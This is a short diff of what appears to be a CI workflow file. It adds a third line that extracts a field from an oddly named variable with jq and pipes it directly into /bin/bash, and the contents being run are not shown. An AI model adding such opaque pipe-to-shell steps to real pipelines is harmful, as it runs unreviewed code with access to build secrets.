@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$k21" | jq -r .qq5277 | /bin/bash
           echo $sn0 | jq -r .gnzzv95 | /bin/bash
+          echo $byz11 | jq -r .zmb24 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
